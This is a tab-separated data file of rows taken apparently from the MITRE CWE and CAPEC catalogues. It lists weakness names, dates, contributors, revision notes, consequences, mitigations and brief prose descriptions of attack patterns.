14189	76	2019-09-30
20081	88	Exposed Dangerous Method or Function
10921	99	Addison-Wesley
9053	28	CWE Content Team
17900	28	CWE Content Team
11655	51	2014-06-23
16037	88	Unprotected Transport of Credentials
9121	53	The MITRE Corporation
19923	61	Draft
7455	104	174
13649	35	MITRE
9492	56	Requires
21473	84	09
14570	91	Architecture and Design
24444	28	CWE Content Team
16061	44	Moderate
20247	36	http://www.owasp.org/index.php/Testing_for_IMAP/SMTP_Injection_(OWASP-DV-011)
18156	39	2009-07-27
9424	35	MITRE
8432	69	Incomplete
9084	35	MITRE
18028	63	Bypass Protection Mechanism
12636	27	ACK scanning can be performed via the use of a port scanner or by raw socket manipulation using a scripting or programming language. Packet injection tools are also useful for this purpose. Depending upon the technique used it may also be necessary to sniff the network in order to see the response.
22304	39	2009-12-28
21933	44	High
7995	46	This includes environmental variables, configuration files, registry keys, command-line switches or options, or system settings.
9605	28	CWE Content Team
19685	28	CWE Content Team
17380	28	CWE Content Team
13565	57	Indirect
22735	42	Use well vetted pseudo-random number generating algorithms with adequate length seeds. Pseudo-random number generators can produce predictable numbers if the generator is known and the seed can be guessed. A 256-bit seed is a good starting point for producing a "random enough" number.
22409	31	699
23744	79	Confidentiality
6550	76	2019-09-30
20883	26	Architecture and Design
16334	62	updated Relationships, Taxonomy_Mappings
14871	43	Simple
19874	90	C++
12761	28	CWE Content Team
11723	39	2019-06-20
13389	39	2017-11-08
10516	79	Availability
19198	35	MITRE
9151	62	updated Relationships
24236	77	Black Box
21586	78	High
9095	23	A product requires authentication, but the product has an alternate path or channel that does not require authentication.
19049	81	Confidentiality
14228	39	2008-09-08
9418	100	The MITRE Corporation
10251	31	1003
9224	66	Exploiting Software: How to Break Code
14563	26	Implementation
25414	92	Explore
24952	81	Non-Repudiation
21467	91	Architecture and Design
10833	62	updated Relationships
20277	26	Architecture and Design
23500	62	updated Relationships, Observed_Example, Taxonomy_Mappings
16376	55	CAPEC Content Team
9640	88	Improper Cleanup on Thrown Exception
7428	76	2017-05-01
17803	40	An attacker is able to identify the nature and mechanism of communication between the two target components.
24992	33	Steven Friedl
13109	86	http://www.slideshare.net/msaindane/black-hat-eu-2010-attacking-java-serialized-communication
17128	39	2012-10-30
14450	39	2019-06-20
6597	103	Primary
15528	39	2010-02-16
10614	51	2014-06-23
11924	28	CWE Content Team
12409	89	Detailed
13263	39	2017-05-03
15923	35	MITRE
11950	35	MITRE
8772	79	Integrity
17519	81	Other
15614	39	2008-09-08
7634	30	Bruce Schneier
19534	62	updated Relationships
20333	76	2017-08-04
8865	28	CWE Content Team
6315	79	Authorization
22514	73	Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim's browser and performs actions on the same web site
6541	56	ChildOf
11303	21	PLOVER
12120	40	Targeted software performs buffer operations.
8713	59	Updated Related_Weaknesses, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit, Typical_Severity
17356	45	Variant
11986	35	MITRE
15828	35	MITRE
24497	34	COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic.
8735	79	Authorization
12646	95	[Execute Flash Parameter Injection Attack] Inject parameters into Flash file. Based on the results of the Experiment phase, the adversary crafts the underlying malicious URL containing injected Flash parameters and submits it to the web server. Once the web server receives the request, the embedding HTML document will controllable by the adversary.
18495	45	Class
19044	36	http://www.owasp.org/index.php/Top_10_2007-A3
17046	51	2014-06-23
15746	62	updated Potential_Mitigations
11212	46	This allows attackers to traverse the file system to access files or directories that are outside of the restricted directory.
14219	21	7 Pernicious Kingdoms
19640	80	To inject the malicious payload in a web page
11185	35	Cigital
14871	23	Accessible test applications can pose a variety of security risks. Since developers or administrators rarely consider that someone besides themselves would even know about the existence of these applications, it is common for them to contain sensitive information or functions.
16418	103	Primary
23168	88	Path Traversal: 'C:dirname'
22879	31	1000
7016	35	MITRE
20596	39	2010-09-27
24690	39	2011-06-01
12147	91	Operation
18555	42	Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.                   For example, consider using the ESAPI Encoding control [REF-45] or a similar tool, library, or framework. These will help the programmer encode outputs in a manner less prone to error.
19654	70	Ajax fingerprinting for Web 2.0 Applications
13891	35	MITRE
20766	57	Primary
17321	61	Draft
6724	35	MITRE
14687	31	699
9982	59	Updated Related_Attack_Patterns, Related_Weaknesses
22376	35	MITRE
21150	35	MITRE
19504	47	Other
17189	28	CWE Content Team
10904	39	2010-04-05
13992	50	Passwords need to be recycled to prevent aging, that is every once in a while a new password must be chosen.
8675	70	PHP Input Validation Vulnerabilities
6835	39	2017-11-08
8281	35	MITRE
12778	39	2012-05-11
15172	35	MITRE
16452	35	MITRE
20247	83	v4 [DRAFT]
24689	96	2013-01-26
18859	104	385
22057	50	Implementation: Use indirect references rather than actual file names.
22469	88	Improper Neutralization of Data within XPath Expressions ('XPath Injection')
15921	25	Low
16144	42	Minimizing the number of statements in a conditional that produce side effects will help to prevent the likelihood of short circuit evaluation to alter control flow in an unexpected way.
21247	62	updated Relationships, Other_Notes, Taxonomy_Mappings
6813	69	Incomplete
6008	56	ChildOf
16255	62	updated Relationships, Taxonomy_Mappings
11594	89	Detailed
24862	35	MITRE
8966	97	ICMP Address Mask Request
19158	62	updated Description, Potential_Mitigations
22372	35	MITRE
14249	35	MITRE
13554	28	CWE Content Team
22179	39	2010-09-27
19597	28	CWE Content Team
11450	62	updated Demonstrative_Examples, Description, Observed_Examples
21713	73	Sequentially request a list of common base files to each directory discovered.
21023	28	CWE Content Team
10807	28	CWE Content Team
9470	43	Simple
12950	28	Eric Dalci
19800	51	2014-06-23
21057	39	2017-11-08
19337	56	ChildOf
22647	92	Exploit
16091	103	Primary
21960	28	CWE Content Team
14821	28	CWE Content Team
6007	54	High
22779	34	Logic errors related to operator precedence may cause problems even during normal operation, so they are probably discovered quickly during the testing phase. If testing is incomplete or there is a strong reliance on manual review of the code, then these errors may not be discovered before the software is deployed.
15916	42	Run or compile the software with settings that generate warnings about uninitialized variables or data.
12161	39	2011-09-13
12309	39	2017-11-08
10212	35	MITRE
19895	61	Draft
24384	35	MITRE
20572	39	2008-07-01
12403	54	Low
15144	101	CAPEC Content Team
15949	27	Manual or user-assisted attacks require deceptive mechanisms to trick the user into clicking a link or downloading and installing software. Automated update attacks require the attacker to host a payload and then trigger the installation of the payload code.
8310	81	Integrity
9200	89	Detailed
9745	35	MITRE
11263	28	CWE Content Team
22968	35	MITRE
6816	39	2008-11-24
9683	73	Inject XML External Entity (XEE) attack that can cause the disclosure of confidential information, execute abitrary code, create a Denial of Service of the targeted server, or several other malicious impacts.
9298	35	MITRE
14945	35	Cigital
12358	35	MITRE
5608	28	CWE Content Team
8566	90	C++
21224	39	2012-05-11
17661	35	Veracode
10576	62	updated Common_Consequences
21243	39	2017-05-03
22624	56	ChildOf
21067	28	CWE Content Team
19070	104	152
12133	59	Updated Description Summary, Examples-Instances, References, Related_Attack_Patterns
20323	104	31
22242	56	ChildOf
24256	40	Input data used in an environment variable is not validated properly.
23212	56	ChildOf
12952	39	2011-06-01
14874	54	High
5955	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Focused Manual Spotcheck - Focused manual analysis of source                            Manual Source Code Review (not inspections)
19982	40	The targeted application or service must rely on web service protocols in such a way that malicious manipulation of them can alter functionality.
6007	78	High
21877	95	[Spoofing] Bad data can be injected into the system by an attacker.
8907	35	MITRE
6122	56	ChildOf
11531	81	Other
7503	93	Defense in Depth
11633	101	CAPEC Content Team
13099	39	2008-07-01
19182	40	The adversary must have the capability to write to the Windows Registry on the targeted system.
23679	95	The attacker gains control of an environment variable and ties to find out what process(es) the environment variable controls.
24859	28	CWE Content Team
10404	28	CWE Content Team
21682	28	CWE Content Team
17948	56	ChildOf
10947	45	Base
16659	103	Primary
9714	100	The MITRE Corporation
20851	26	Architecture and Design
13534	28	CWE Content Team
20933	35	MITRE
5779	88	Excessive Data Query Operations in a Large Data Table
18567	62	updated Description, Type
23184	45	Base
14153	47	Modify Data
18764	51	2014-06-23
10465	28	CWE Content Team
23529	35	MITRE
6378	28	CWE Content Team
17091	96	2018-01-04
18776	81	Other
19763	104	384
11132	39	2012-05-11
17563	35	Cigital
17878	42	Because this function call often produces incorrect behavior it will usually be detected during testing or normal operation of the software. During testing exercise all possible control paths will typically expose this weakness except in rare cases when the incorrect function call accidentally produces the correct results or if the provided argument type is very similar to the expected argument type.
12771	42	Do not expose sensitive error information to the user.
13487	28	CWE Content Team
9203	23	When a Java application uses the Java Native Interface (JNI) to call code written in another programming language, it can expose the application to weaknesses in that code, even if those weaknesses cannot occur in Java.
6075	56	ChildOf
22472	45	Base
10618	56	ChildOf
10469	31	1000
6826	39	2012-10-30
8520	28	CWE Content Team
6853	88	Return of Stack Variable Address
7219	35	MITRE
22275	56	StartsWith
21385	28	CWE Content Team
6475	86	http://www.schneier.com/book-applied.html
16366	72	The source of an attack will be difficult or impossible to determine. This can allow attacks to the system to continue without notice.
9021	26	Implementation
10402	39	2009-07-27
18603	42	Do not use user-controlled data for loop conditions.
9194	28	CWE Content Team
20432	39	2008-11-24
15972	56	ChildOf
6376	101	CAPEC Content Team
15168	62	updated Relationships
13941	62	updated Relationships
9750	28	CWE Content Team
10231	62	updated Type
20544	59	Updated Related_Attack_Patterns
21511	63	Unexpected State
22791	81	Access Control
7066	62	updated Potential_Mitigations
5971	62	updated Related_Attack_Patterns
18012	79	Confidentiality
24413	53	The MITRE Corporation
9870	62	updated Alternate_Terms, Detection_Factors, Potential_Mitigations, References, Relationships
14079	28	CWE Content Team
16843	33	Ronald L. Rivest
7441	100	The MITRE Corporation
13473	43	Simple
7782	35	MITRE
8128	39	2011-06-27
12946	42	Properly check all functions which return a value.
16292	81	Other
7912	28	CWE Content Team
17571	31	700
7130	72	The error message may contain the location of the file in which the offending function is located. This may disclose the web root's absolute path as well as give the attacker the location of application files or configuration information. It may even disclose the portion of code that failed. In many cases, an attacker can use the data to launch further attacks against the system.
7412	42	Use a CPU and operating system that offers Data Execution Protection (NX) or its equivalent [REF-60] [REF-61].
17373	62	updated Name
10370	71	2016
16947	28	CWE Content Team
21306	26	Implementation
17220	39	2008-09-08
6482	76	2018-07-31
18998	76	2019-04-04
12501	81	Other
17292	88	Context Switching Race Condition
16401	45	Base
20876	81	Other
12653	100	The MITRE Corporation
11388	39	2014-02-18
22105	28	CWE Content Team
20829	81	Availability
16627	28	CWE Content Team
19440	24	Purdue University
13677	63	Read Application Data
11190	31	1000
7269	90	Java
18579	62	updated Potential_Mitigations
7923	42	Design throttling mechanisms into the system architecture. The best protection is to limit the amount of resources that an unauthorized user can cause to be expended. A strong authentication and access control model will help prevent such attacks from occurring in the first place, and it will help the administrator to identify who is committing the abuse. The login application should be protected against DoS attacks as much as possible. Limiting the database access, perhaps by caching result sets, can help minimize the resources expended. To further limit the potential for a DoS attack, consider tracking the rate of requests received from users and blocking requests that exceed a defined rate threshold.
22481	39	2018-03-27
14124	90	Language-Independent
9226	62	updated Description
20957	39	2008-07-01
25317	59	Updated Attack_Motivation-Consequences, Attack_Prerequisites, Attacker_Skills_or_Knowledge_Required, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit, Typical_Severity
23466	62	updated Taxonomy_Mappings, Time_of_Introduction
16549	39	2018-03-27
25097	39	2010-02-16
20949	39	2008-09-08
10767	39	2017-11-08
6343	68	The effectiveness of this mitigation depends on the prevention capabilities of the specific sandbox or jail being used and might only help to reduce the scope of an attack, such as restricting the attacker to certain system calls or limiting the portion of the file system that can be accessed.
8299	28	CWE Content Team
9578	62	updated Time_of_Introduction
18118	21	Pascal Meunier
19190	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
15055	62	updated Relationships, Taxonomy_Mappings
5660	100	The MITRE Corporation
24354	42	This is a complex topic. See the book Translucent Databases for a good discussion of best practices.
10970	35	MITRE
15415	31	1000
11996	104	451
10748	62	updated Demonstrative_Examples, Related_Attack_Patterns
6616	28	CWE Content Team
23400	62	updated Alternate_Terms, Applicable_Platforms, Common_Consequences, Demonstrative_Examples, Description, Detection_Factors, Likelihood_of_Exploit, Name, Observed_Examples, Other_Notes, Potential_Mitigations, References, Related_Attack_Patterns, Relationship_Notes, Relationships, Research_Gaps, Taxonomy_Mappings, Terminology_Notes, Time_of_Introduction, Weakness_Ordinalities
22553	40	The target application must accept a string as user input, fail to sanitize characters that have a special meaning in the parameter encoding, and insert the user-supplied string in an encoding which is then processed.
10730	77	Black Box
21898	79	Confidentiality
6334	100	The MITRE Corporation
5918	53	The MITRE Corporation
10919	35	MITRE
18356	89	Detailed
9623	23	A NULL pointer dereference occurs when the application dereferences a pointer that it expects to be valid, but is NULL, typically causing a crash or exit.
8508	103	Primary
11595	47	Bypass Protection Mechanism
23778	61	Draft
7941	55	CAPEC Content Team
22075	31	699
18603	91	Implementation
13484	45	Variant
10070	31	1000
8287	63	Other
18286	62	updated Relationships
12325	28	CWE Content Team
13977	95	[Verify that target host's platform supports symbolic links.] This attack pattern is only applicable on platforms that support symbolic links.
13977	92	Explore
14794	97	Pointer Manipulation
24021	28	CWE Content Team
24437	63	DoS: Resource Consumption (Memory)
13897	28	CWE Content Team
12382	25	Low
7055	81	Confidentiality
14491	39	2008-07-01
22368	28	CWE Content Team
16872	63	Read Application Data
11264	39	2012-05-11
13951	35	MITRE
13704	35	MITRE
11431	35	MITRE
12922	35	MITRE
14588	31	1000
6573	42	The use of X-Frame-Options allows developers of web content to restrict the usage of their application within the form of overlays, frames, or iFrames. The developer can indicate from which domains can frame the content.                   The concept of X-Frame-Options is well documented, but implementation of this protection mechanism is in development to cover gaps. There is a need for whitelisting and allowing frames from multiple domains.
16037	104	523
12667	39	2012-05-11
7875	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Web Application Scanner                            Web Services Scanner                            Database Scanners
21319	35	MITRE
20921	35	MITRE
7378	62	updated Time_of_Introduction
19111	62	updated Name
9476	88	Reusing a Nonce, Key Pair in Encryption
23451	47	Read Data
6007	40	The target application must accept a strings as user input, fail to sanitize string formatting characters in the user input, and process this string using functions that interpret string formatting characters.
8308	23	The software does not preserve permissions or incorrectly preserves permissions when copying, restoring, or sharing objects, which can cause them to have less restrictive permissions than intended.
23239	85	169
22566	28	CWE Content Team
8486	61	Draft
23153	92	Explore
6912	40	Recipient is using a weak cryptographic signature verification algorithm or a weak implementation of a cryptographic signature verification algorithm, or the configuration of the recipient's application accepts the use of keys generated using cryptographically weak signature verification algorithms.
12304	92	Explore
7368	81	Integrity
20673	26	Implementation
12650	56	ChildOf
19038	46	This issue can prevent the software from running reliably.  If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability.
15156	28	CWE Content Team
11673	28	Eric Dalci
21254	62	updated Applicable_Platforms
13460	102	ChildOf
23831	35	MITRE
10158	103	Primary
13890	56	Requires
13908	79	Confidentiality
19802	104	1054
21326	35	MITRE
25257	56	CanPrecede
20094	60	11
19662	49	2005
17975	51	2014-06-23
7583	69	Draft
20394	88	Cleartext Storage of Sensitive Information
9407	39	2012-05-11
9201	31	699
25145	31	1000
21194	101	CAPEC Content Team
12386	39	2011-06-01
6456	42	Make any static fields private and constant.                   A constant field is denoted by the keyword 'const' in C/C++ and ' final' in Java
5829	62	updated Alternate_Terms, Applicable_Platforms, Demonstrative_Examples, Likelihood_of_Exploit, Potential_Mitigations, Time_of_Introduction
10814	69	Incomplete
24224	56	ChildOf
24766	62	added/updated demonstrative examples
13307	42	With Struts, write all data from form beans with the bean's filter attribute set to true.
10450	35	MITRE
11783	103	Primary
9323	28	CWE Content Team
11175	35	MITRE
20990	73	Attacker adds extra characters (e.g. adding an extra . after the file extension) to filenames of files submitted to web server.
21317	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Compare binary / bytecode to application permission manifest                                                                     Cost effective for partial coverage:                                                                           Bytecode Weakness Analysis - including disassembler + source code weakness analysis                            Binary Weakness Analysis - including disassembler + source code weakness analysis
11658	92	Experiment
15018	81	Integrity
13395	56	ChildOf
16151	78	High
13281	23	The software, by default, initializes an internal variable with an insecure or less secure value than is possible.
15174	62	updated Relationships
14100	62	updated Detection_Factors, Potential_Mitigations, References
7434	28	CWE Content Team
23112	39	2010-02-16
9452	35	MITRE
20419	28	CWE Content Team
21464	47	Bypass Protection Mechanism
21931	35	KDM Analytics
10571	39	2009-03-10
23708	69	Draft
11936	35	MITRE
24750	21	PLOVER
21731	62	updated Potential_Mitigations
7871	28	CWE Content Team
11028	43	Simple
21307	33	Sven Lachmund
9868	102	ChildOf
20342	31	699
21160	23	The Servlet does not catch all exceptions, which may reveal sensitive debugging information.
8218	57	Resultant
16794	42	For all configuration files, executables, and libraries, make sure that they are only readable and writable by the software's administrator.
7988	39	2014-07-30
18935	62	updated Other_Notes
13889	56	CanPrecede
17305	28	CWE Content Team
7397	62	updated Potential_Mitigations
13600	88	Use of Client-Side Authentication
20775	26	Implementation
11342	66	Economy of Mechanism
8647	101	CAPEC Content Team
16814	81	Availability
20888	93	Defense in Depth
9612	39	2019-09-19
17083	59	Updated Description, Description Summary, Related_Weaknesses
14139	77	Manual Static Analysis - Binary or Bytecode
19495	39	2014-07-30
6007	23	An adversary includes formatting characters in a string input field on the target application. Most applications assume that users will provide static text and may respond unpredictably to the presence of formatting character. For example, in certain functions of the C programming languages such as printf, the formatting character %s will print the contents of a memory location expecting this location to identify a string and the formatting character %n prints the number of DWORD written in the memory. An adversary can use this to read or write to memory locations or files, or simply to manipulate the value of the resulting text in unexpected ways. Reading or writing memory may result in program crashes and writing memory could result in the execution of arbitrary code if the adversary can write to the program stack.
18021	62	added/updated white box definitions
12960	62	updated Relationships, Taxonomy_Mappings
12932	32	SecurityFocus
14990	104	492
18875	62	updated Relationships, Taxonomy_Mappings
24130	62	updated Relationships
5958	62	updated Related_Attack_Patterns
12446	103	Primary
8575	97	Homograph Attack via Homoglyphs
11752	35	MITRE
23336	62	updated Relationships
11869	35	MITRE
10417	62	updated Relationships, Taxonomy_Mappings
5583	49	2010
21821	74	3
17022	28	CWE Content Team
6995	49	2002
6562	101	CAPEC Content Team
21722	63	Read Files or Directories
17405	88	Untrusted Pointer Dereference
25242	73	Fetch .htaccess file. In Apache web server installations, the .htaccess file may enable server side includes in specific locations. In those cases, the .htaccess file lives inside the directory where SSI is enabled, and is theoretically fetchable from the web server. Although most web servers deny fetching the .htaccess file, a misconfigured server will allow it. Thus, an attacker will frequently try it.
18330	62	updated Relationships, Other_Notes, Taxonomy_Mappings, Weakness_Ordinalities
18018	69	Incomplete
7578	50	Use known algorithm to avoid deadlock condition (for instance non-blocking synchronization algorithms).
8187	35	MITRE
5951	21	PLOVER
18334	28	CWE Content Team
17643	62	updated Applicable_Platforms, Description, Name, Potential_Mitigations, Terminology_Notes
10948	23	The adversary leverages a perception of scarcity to persuade the target to perform an action or divulge information that is advantageous to the adversary. By conveying a perception of scarcity, or a situation of limited supply, the adversary aims to create a sense of urgency in the context of a target's decision-making process.
19560	71	2008
15027	61	Stable
22431	72	An attacker may be able to read sensitive information from the associated resource, such as credentials or configuration information stored in a file.
17041	39	2009-12-28
15042	85	31
12902	28	CWE Content Team
19598	52	The external control or influence of filenames can often be detected using automated static analysis that models data flow within the software.                   Automated static analysis might not be able to recognize when proper input validation is being performed, leading to false positives - i.e., warnings that do not have any security consequences or require any code changes.
15911	28	CWE Content Team
23256	102	ChildOf
15002	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
11341	56	ChildOf
23575	101	CAPEC Content Team
13129	81	Integrity
20842	50	Ideas for creating random numbers are offered by Eastlake [RFC1750]
19636	91	Architecture and Design
24293	35	MITRE
21285	90	Language-Independent
17775	35	MITRE
15913	81	Other
12176	59	Updated Consequences
20180	28	CWE Content Team
10993	56	ChildOf
9633	33	Bruce Dawson
10164	35	MITRE
23745	73	Develop malicious JavaScript that injected through vectors identified during the Experiment Phase and takes commands from an attacker's server and then causes the browser to execute request to other web sites (especially the web applications that have CSRF vulnerabilities).
12680	91	Architecture and Design
16553	56	ChildOf
23956	35	MITRE
15677	62	updated Relationships, Taxonomy_Mappings
6444	62	updated Common_Consequences, Other_Notes
16139	39	2019-06-20
10973	56	ChildOf
10033	39	2012-05-11
25285	86	http://kb2.adobe.com/cps/142/tn_14213.html
17350	62	updated Potential_Mitigations
6680	39	2012-10-30
9929	39	2011-06-27
17633	28	CWE Content Team
19028	95	[Perform SQL Injection through the generated data access layer] An attacker proceeds to exploit a weakness in the generated data access methods that does not properly separate control plane from the data plan, or potentially a particular way in which developer might have misused the generated code, to modify the structure of the executed SQL queries and/or inject entirely new SQL queries.
8912	28	CWE Content Team
16436	62	updated Demonstrative_Examples, Description, Name, Observed_Examples, Other_Notes, Potential_Mitigations, Relationships
23695	39	2008-09-08
22607	31	1000
23874	44	SOAR Partial
9672	63	Modify Files or Directories
20759	101	CAPEC Content Team
10231	39	2017-01-19
15051	103	Primary
19831	76	2018-07-31
24421	62	updated Relationships, Taxonomy_Mappings
21192	39	2009-12-28
7929	62	updated Relationships
22514	73	Develop malicious JavaScript that injected through vectors identified during the Experiment Phase and takes commands from an attacker's server and then causes the browser to execute request to other web sites (especially the web applications that have CSRF vulnerabilities).
9011	39	2008-07-01
20992	81	Confidentiality
14360	35	MITRE
17588	79	Availability
16464	62	updated Common_Consequences
9075	45	Class
24823	35	MITRE
23365	47	Gain Privileges
21058	91	Implementation
9236	28	CWE Content Team
9607	39	2014-07-30
6356	42	Perform a type check before interpreting an object.
7571	72	The attacker may be able to overwrite or create critical files, such as programs, libraries, or important data. If the targeted file is used for a security mechanism, then the attacker may be able to bypass that mechanism. For example, appending a new account at the end of a password file may allow an attacker to bypass authentication.
15405	28	CWE Content Team
18286	35	MITRE
19903	62	updated Relationships, Taxonomy_Mappings
14238	39	2017-11-08
11594	40	The target system leaks data (in some way) on whether a padding error has occurred when attempting to decrypt the ciphertext.
13736	40	Targeted software is utilizing application framework APIs
14244	28	CWE Content Team
21061	73	Use a proxy tool to record all links visited during a manual traversal of the web application. Make special note of any links that include parameters in the URL. Manual traversal of this type is frequently necessary to identify forms that are GET method forms rather than POST forms.
17593	35	MITRE
18552	21	CLASP
24687	33	Brian Chess
25264	63	Reduce Maintainability
12432	53	The MITRE Corporation
8857	102	ChildOf
21672	35	MITRE
13611	39	2014-02-18
10491	28	CWE Content Team
10193	78	Medium
10542	81	Other
22262	26	Architecture and Design
6390	78	High
15589	39	2010-04-05
8733	62	updated Potential_Mitigations, Time_of_Introduction
18817	62	updated References
16871	76	2018-07-31
9005	28	CWE Content Team
14329	39	2008-09-08
21670	28	CWE Content Team
22506	84	13
10813	35	MITRE
23592	55	CAPEC Content Team
13215	62	updated Common_Consequences
10471	35	MITRE
18839	35	MITRE
13476	62	updated Common_Consequences
25281	62	updated Potential_Mitigations
13656	62	updated Potential_Mitigations, Time_of_Introduction
22311	43	Simple
5638	48	04
10973	103	Primary
13077	62	updated Relationships
7709	39	2011-06-01
21460	89	Detailed
25014	95	[Craft malicious libraries] The attacker uses knowledge gained in the Explore phase to craft malicious libraries that he will redirect the target to leverage. These malicious libraries could have the same APIs as the legitimate library and additional malicious code.
22866	42	Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.                   When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."                   Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.
17356	88	Improper Neutralization of Script in Attributes in a Web Page
22860	74	1
7771	31	1003
13596	62	updated Common_Consequences, Description, Other_Notes, Potential_Mitigations
7179	62	updated Relationships
9461	31	1003
9978	28	CWE Content Team
16711	34	COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic.
11455	80	Knowledge of how to load malicious code into the memory space of a running process, as well as the ability to have the running process execute this code. For example, with DLL injection, the adversary must know how to load a DLL into the memory space of another running process, and cause this process to execute the code inside of the DLL.
24538	40	System must use weak authentication mechanisms for administrative functions.
17891	51	2014-06-23
17332	39	2010-04-05
14323	66	Insertion, Evasion, and Denial of Service: Eluding Network Intrusion Detection
20209	39	2008-10-10
16734	39	2010-09-09
11990	35	MITRE
8355	39	2008-09-08
17577	62	updated Relationships, Other_Notes, Taxonomy_Mappings
22705	34	This issue is currently reported for unhandled exceptions, but it is theoretically possible any time the programmer does not close the cursor at the proper time.
22940	45	Base
14206	88	Uncontrolled Search Path Element
11356	35	MITRE
13037	30	Tom Stracener
8903	39	2010-06-21
11080	31	1000
11251	35	MITRE
19137	93	Limited
5651	31	1000
7434	62	updated Description, Relationships, Other_Notes, Relationship_Notes, Taxonomy_Mappings
16592	28	CWE Content Team
6703	62	updated Relationships
21506	34	This weakness is introduced during the design of an application when the architect does not specify that a linked external document should not be able to alter the location of the calling page.
19621	46	Just as neglecting to include functionality for the management of password aging is dangerous, so is allowing password aging to continue unchecked. Passwords must be given a maximum life span, after which a user is required to update with a new and different password.
10856	62	updated Common_Consequences
17354	56	ChildOf
9133	28	CWE Content Team
24314	76	2015-12-07
18405	35	MITRE
19030	35	MITRE
10946	97	Functionality Bypass
7220	28	CWE Content Team
11342	33	Michael Gegick
6274	39	2008-09-08
24559	31	1003
12086	50	To mitigate this type of an attack, an organization can attempt to identify the 3rd party services being used in an active attack and blocking them until the attack ends. This can be accomplished by filtering traffic for suspicious message patterns such as a spike in traffic where each response contains the same large block of data. Care should be taken to prevent false positive rates so legitimate traffic isn't blocked.
12728	92	Explore
19613	59	Updated Description, Description Summary, Related_Weaknesses
13984	33	Andrew J. Kalafut
6590	35	MITRE
24988	35	MITRE
9925	47	Unreliable Execution
16498	39	2010-09-27
5594	26	Implementation
11610	63	Bypass Protection Mechanism
10186	69	Draft
9375	62	updated Common_Consequences
23257	31	1000
12775	62	updated Relationships
10122	91	Implementation
11750	89	Meta
11798	35	MITRE
12204	28	CWE Content Team
19460	31	1000
24551	42	Implement the validate() method and call super.validate() within that method.
5851	73	Execute local commands via the URL input.
16661	102	ChildOf
21802	28	CWE Content Team
19231	35	MITRE
18065	62	updated Demonstrative_Examples
12663	28	CWE Content Team
23043	35	MITRE
11191	39	2011-03-29
22135	103	Primary
15605	23	The software does not handle or incorrectly handles when a value is not defined or supported for the associated parameter, field, or argument name.
23427	85	390
7664	85	601
23008	100	The MITRE Corporation
23554	101	CAPEC Content Team
11930	56	ChildOf
6096	81	Integrity
25434	35	MITRE
21888	76	2017-01-09
13783	92	Exploit
11338	94	Data Modification
15902	89	Standard
15761	79	Access Control
16784	26	Implementation
21158	62	updated Relationships, Taxonomy_Mappings
15169	28	CWE Content Team
10146	63	Varies by Context
23260	62	updated Relationships
14819	86	http://msdn.microsoft.com/en-us/library/ms998280.aspx
14605	21	CWE Content Team
16914	62	updated Demonstrative_Examples, References, Relationships
14502	79	Integrity
17515	70	Beware of BGP Attacks
6508	39	2014-07-30
10007	62	updated References
15451	63	Bypass Protection Mechanism
8473	35	MITRE
7600	28	CWE Content Team
24821	28	CWE Content Team
25160	62	updated Demonstrative_Examples
14414	62	updated Relationships
13033	77	Automated Static Analysis - Binary or Bytecode
25290	43	Simple
15492	28	CWE Content Team
17956	81	Confidentiality
25319	31	699
16068	102	CanPrecede
16008	91	Implementation
17139	63	Unexpected State
17738	66	Top 25 Series - Rank 17 - Integer Overflow Or Wraparound
15877	76	2017-08-04
11112	26	Architecture and Design
10442	62	updated Potential_Mitigations
19827	103	Primary
11583	39	2008-09-08
24478	28	CWE Content Team
15091	101	CAPEC Content Team
7401	61	Draft
12384	90	Language-Independent
11931	84	11
9992	102	ChildOf
10842	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
15295	35	MITRE
25313	62	updated Applicable_Platforms, Common_Consequences, Description, Relationships, Observed_Example, Other_Notes, References, Taxonomy_Mappings
17851	45	Base
25121	26	Implementation
19568	39	2014-02-18
15439	66	Automated Source Code Performance Efficiency Measure (ASCPEM)
9991	56	ChildOf
18453	57	Resultant
6165	88	Command Shell in Externally Accessible Directory
5716	39	2008-09-08
11644	31	1000
16515	39	2014-07-30
17872	81	Availability
21899	62	updated Applicable_Platforms, Causal_Nature
18224	39	2011-06-27
8238	33	Bill Grindlay
22648	47	Modify Data
18665	55	CAPEC Content Team
24232	97	Establish Rogue Location
7714	39	2014-06-23
24015	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
9138	32	Refsnes Data
20954	35	MITRE
23763	28	CWE Content Team
19243	95	[Use stolen credentials to log into legitimate site] Once the attacker captures some sensitive information through phishing (login credentials, credit card information, etc.) the attacker can leverage this information. For instance, the attacker can use the victim's login credentials to log into their bank account and transfer money to an account of their choice.
7626	28	CWE Content Team
6363	91	Implementation
15114	35	MITRE
24121	28	CWE Content Team
10861	42	Switch to bounded string manipulation functions. Inspect buffer lengths involved in the buffer overrun trace reported with the defect.
11824	39	2008-07-01
21899	28	CWE Content Team
21449	102	ChildOf
24517	62	updated Common_Consequences
24870	46	This weakness class covers several possibilities:                                                the comparison checks one factor incorrectly;                   the comparison should consider multiple factors, but it does not check some of those factors at all;                   the comparison checks the wrong factor.
7317	52	While this weakness might be caught by the compiler in some languages, it can occur more frequently in cases in which the called function accepts variable numbers of arguments, such as format strings in C. It also can occur in languages or environments that do not require that functions always be called with the correct number of arguments, such as Perl.
17579	88	Incomplete Identification of Uploaded File Variables (PHP)
24822	28	CWE Content Team
